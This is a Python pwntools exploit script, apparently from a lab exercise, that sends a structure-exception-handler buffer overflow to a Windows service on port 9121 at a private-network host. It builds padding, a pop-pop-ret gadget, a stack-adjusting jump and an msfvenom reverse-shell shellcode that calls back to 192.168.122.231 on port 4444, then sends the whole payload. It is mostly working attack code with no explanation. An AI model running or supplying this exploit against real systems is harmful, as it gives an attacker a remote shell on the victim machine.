#!/usr/bin/env python3

from pwn import *


lpad = b'\x41' * 124
nop = b'\x90' * 16

# 00 02 0a 0d
bad = bytes(i for i in range(128, 256) if i not in b'\x02\x0a\x0d')

jmp = b'\x90\x90\xeb\x05'

hop =  b'\x89\xe0'         # mov eax, esp
hop += b'\x66\x05\xae\x06' # add ax, 0x6ae
hop += b'\xff\xe0'         # jmp eax

# msfvenom -p windows/shell_reverse_tcp -b '\x00\x02\x0a\0d' -f py LHOST=192.168.122.231 LPORT=4444 EXITFUNC=seh
buf =  b""
buf += b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\xb3\xee\xf7\xd2\x83\xee\xfc\xe2\xf4\x4f\x06"
buf += b"\x75\xd2\xb3\xee\x97\x5b\x56\xdf\x37\xb6\x38\xbe\xc7"
buf += b"\x59\xe1\xe2\x7c\x80\xa7\x65\x85\xfa\xbc\x59\xbd\xf4"
buf += b"\x82\x11\x5b\xee\xd2\x92\xf5\xfe\x93\x2f\x38\xdf\xb2"
buf += b"\x29\x15\x20\xe1\xb9\x7c\x80\xa3\x65\xbd\xee\x38\xa2"
buf += b"\xe6\xaa\x50\xa6\xf6\x03\xe2\x65\xae\xf2\xb2\x3d\x7c"
buf += b"\x9b\xab\x0d\xcd\x9b\x38\xda\x7c\xd3\x65\xdf\x08\x7e"
buf += b"\x72\x21\xfa\xd3\x74\xd6\x17\xa7\x45\xed\x8a\x2a\x88"
buf += b"\x93\xd3\xa7\x57\xb6\x7c\x8a\x97\xef\x24\xb4\x38\xe2"
buf += b"\xbc\x59\xeb\xf2\xf6\x01\x38\xea\x7c\xd3\x63\x67\xb3"
buf += b"\xf6\x97\xb5\xac\xb3\xea\xb4\xa6\x2d\x53\xb1\xa8\x88"
buf += b"\x38\xfc\x1c\x5f\xee\x86\xc4\xe0\xb3\xee\x9f\xa5\xc0"
buf += b"\xdc\xa8\x86\xdb\xa2\x80\xf4\xb4\x11\x22\x6a\x23\xef"
buf += b"\xf7\xd2\x9a\x2a\xa3\x82\xdb\xc7\x77\xb9\xb3\x11\x22"
buf += b"\x82\xe3\xbe\xa7\x92\xe3\xae\xa7\xba\x59\xe1\x28\x32"
buf += b"\x4c\x3b\x60\xb8\xb6\x86\x37\x7a\xc9\x09\x9f\xd0\xb3"
buf += b"\xff\xab\x5b\x55\x84\xe7\x84\xe4\x86\x6e\x77\xc7\x8f"
buf += b"\x08\x07\x36\x2e\x83\xde\x4c\xa0\xff\xa7\x5f\x86\x07"
buf += b"\x67\x11\xb8\x08\x07\xdb\x8d\x9a\xb6\xb3\x67\x14\x85"
buf += b"\xe4\xb9\xc6\x24\xd9\xfc\xae\x84\x51\x13\x91\x15\xf7"
buf += b"\xca\xcb\xd3\xb2\x63\xb3\xf6\xa3\x28\xf7\x96\xe7\xbe"
buf += b"\xa1\x84\xe5\xa8\xa1\x9c\xe5\xb8\xa4\x84\xdb\x97\x3b"
buf += b"\xed\x35\x11\x22\x5b\x53\xa0\xa1\x94\x4c\xde\x9f\xda"
buf += b"\x34\xf3\x97\x2d\x66\x55\x09\xdc\x81\x04\x9f\x74\x26"
buf += b"\x53\x6a\x2d\x66\xd2\xf1\xae\xb9\x6e\x0c\x32\xc6\xeb"
buf += b"\x4c\x95\xa0\x9c\x98\xb8\xb3\xbd\x08\x07"

rpad = b'\x42' * (1000 - len(lpad) - 4 - 4 - len(nop) - len(hop) - len(nop) - len(buf))

# 0x10043c27: pop esi ; pop ecx ; ret  ;
ppr = p32(0x10043c27)

payload = lpad + jmp + ppr + nop + hop + nop + buf + rpad 

header =  b'\x75\x19\xba\xab'
header += b'\x03\x00\x00\x00'
header += b'\x00\x40\x00\x00'

header += p32(len(payload))
header += p32(len(payload))
header += p32(payload[-1])

payload = header + payload 

with remote('192.168.122.191', 9121) as r:
    r.write(payload)

